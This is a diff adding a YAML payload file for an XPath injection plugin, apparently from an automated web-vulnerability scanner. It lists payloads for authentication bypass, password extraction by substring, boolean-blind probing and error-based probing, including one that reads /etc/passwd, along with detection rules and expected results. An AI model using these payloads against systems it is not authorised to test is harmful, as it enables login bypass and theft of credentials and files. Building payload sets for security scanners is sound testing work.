@@ -1,0 +1,92 @@
+# XPath Injection Payloads Database
+# Plugin: core.injection.xpath_injection
+
+plugin_id: core.injection.xpath_injection
+mutation_type: field_injection
+payload_type: xpath
+
+variants:
+  # Variant 1: Authentication bypass
+  - id: auth_bypass
+    payloads:
+      - "' or '1'='1"
+      - "' or 1=1 or ''='"
+      - "x' or 1=1 or 'x'='y"
+    tech_stack: []
+    confidence_boost: 0.20
+    detection: status_code == 200 AND body_matches_any(authenticated, logged in, welcome)
+    auto_variants:
+      encoding_chains:
+        - [url_encode]
+        - [unicode_escape]
+      obfuscation: []
+      max_combinations: 6
+
+  # Variant 2: Data extraction
+  - id: data_extraction
+    payloads:
+      - "' or substring(//user[1]/password,1,1)='a"
+      - "' or count(//user)>0 or ''='"
+      - "' or string-length(//user[1]/password)>0 or ''='"
+    tech_stack: []
+    confidence_boost: 0.18
+    detection: body_contains(password) OR body_contains(user)
+    auto_variants:
+      encoding_chains:
+        - [url_encode]
+      obfuscation: []
+      max_combinations: 4
+
+  # Variant 3: Boolean blind
+  - id: boolean_blind
+    payloads:
+      - "' and '1'='1"
+      - "' and '1'='2"
+      - "' and substring(//user[1]/password,1,1)='a' and ''='"
+    tech_stack: []
+    confidence_boost: 0.15
+    detection: response_diff > 0.3
+    auto_variants:
+      encoding_chains:
+        - [url_encode]
+      obfuscation: []
+      max_combinations: 4
+
+  # Variant 4: Error-based
+  - id: error_based
+    payloads:
+      - "' or name()='username' or ''='"
+      - "' or local-name()='password' or ''='"
+      - "doc('//etc/passwd')"
+    tech_stack: []
+    confidence_boost: 0.22
+    detection: body_matches_any(xpath, parse error, syntax)
+    auto_variants:
+      encoding_chains:
+        - [url_encode]
+      obfuscation: []
+      max_combinations: 4
+
+keywords:
+  - username
+  - user
+  - login
+  - query
+  - search
+  - filter
+  - xml
+  - xpath
+
+expected_results:
+  auth_bypass:
+    indicator: auth_bypass
+    expected_output: "authenticated"
+  data_extraction:
+    indicator: info_disclosure
+    expected_output: "user"
+  boolean_blind:
+    indicator: blind_injection
+    expected_output: ""
+  error_based:
+    indicator: error_disclosure
+    expected_output: "xpath"
